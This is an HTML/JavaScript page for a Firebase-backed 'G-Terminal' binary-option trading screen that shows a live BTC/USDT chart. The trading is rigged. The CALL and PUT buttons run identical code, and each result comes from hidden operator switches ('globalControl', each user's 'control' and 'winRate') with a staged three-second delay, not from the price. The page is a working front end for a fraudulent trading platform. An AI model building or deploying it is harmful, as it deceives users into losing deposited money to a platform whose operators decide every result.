<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trade Terminal | G-Terminal</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        body { background: #0b0e11; color: white; font-family: sans-serif; margin: 0; overflow: hidden; }
        .top-bar { padding: 15px; background: #1e2329; display: flex; justify-content: space-between; }
        #chart-box { height: 450px; background: #000; }
        .controls { position: fixed; bottom: 0; width: 100%; background: #1e2329; padding: 20px; box-sizing: border-box; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; border-radius: 25px 25px 0 0; }
        .btn { padding: 15px; border: none; border-radius: 10px; color: white; font-weight: bold; font-size: 1.1rem; }
        .btn-up { background: #0ecb81; } .btn-down { background: #f6465d; }
        #result-pop { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; z-index: 999; }
        .res-card { padding: 40px; border-radius: 20px; text-align: center; width: 300px; }
        .win { background: #0ecb81; } .loss { background: #f6465d; }
    </style>
</head>
<body>
    <div class="top-bar">
        <span>BTC/USDT ⚡</span>
        <span id="bal-display">$0.00</span>
    </div>
    <div id="chart-box">
        <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3ABTCUSDT&interval=1&theme=dark" width="100%" height="100%" frameborder="0"></iframe>
    </div>
    <div class="controls">
        <input type="number" id="t-amt" placeholder="Amount ($)" style="grid-column: span 2; padding: 12px; background: #2b3139; color: white; border: 1px solid #444; border-radius: 8px; margin-bottom: 10px;">
        <button class="btn btn-up" onclick="startTrade()">CALL (UP)</button>
        <button class="btn btn-down" onclick="startTrade()">PUT (DOWN)</button>
    </div>

    <div id="result-pop">
        <div id="res-card" class="res-card">
            <h1 id="res-title"></h1>
            <p id="res-amt"></p>
            <button onclick="location.reload()" style="padding:10px 20px; border-radius:5px; border:none; cursor:pointer;">CONTINUE</button>
        </div>
    </div>

    <script>
        firebase.initializeApp({ apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com" });
        const db = firebase.database();
        const auth = firebase.auth();

        let currentBal = 0;
        auth.onAuthStateChanged(user => {
            db.ref('users/' + user.uid).on('value', s => { 
                currentBal = s.val().balance; 
                document.getElementById('bal-display').innerText = "$" + currentBal.toFixed(2); 
            });
        });

        function startTrade() {
            const amt = parseFloat(document.getElementById('t-amt').value);
            if(amt > currentBal || !amt) return alert("Invalid Balance!");
            
            document.querySelectorAll('.btn').forEach(b => b.disabled = true);
            
            setTimeout(() => {
                const uid = auth.currentUser.uid;
                // Fetch Controls
                Promise.all([db.ref('settings/globalControl').get(), db.ref('users/'+uid).get()]).then(res => {
                    const gMode = res[0].val() || "NORMAL";
                    const uData = res[1].val();
                    const uMode = uData.control || "NORMAL";
                    const winRate = uData.winRate || 50;

                    let isWin = false;
                    if(gMode === "WIN") isWin = true;
                    else if(gMode === "LOSS") isWin = false;
                    else if(uMode === "WIN") isWin = true;
                    else if(uMode === "LOSS") isWin = false;
                    else isWin = (Math.floor(Math.random() * 100) < winRate);

                    const profit = isWin ? (amt * 1.85) : 0;
                    db.ref('users/'+uid).update({ balance: (currentBal - amt) + profit, control: "NORMAL" });

                    document.getElementById('result-pop').style.display = 'flex';
                    document.getElementById('res-card').className = "res-card " + (isWin ? "win" : "loss");
                    document.getElementById('res-title').innerText = isWin ? "PROFIT" : "LOSS";
                    document.getElementById('res-amt').innerText = isWin ? "+$" + (amt*0.85).toFixed(2) : "-$" + amt;
                });
            }, 3000); // 3 Sec delay for feel
        }
    </script>
</body>
</html>
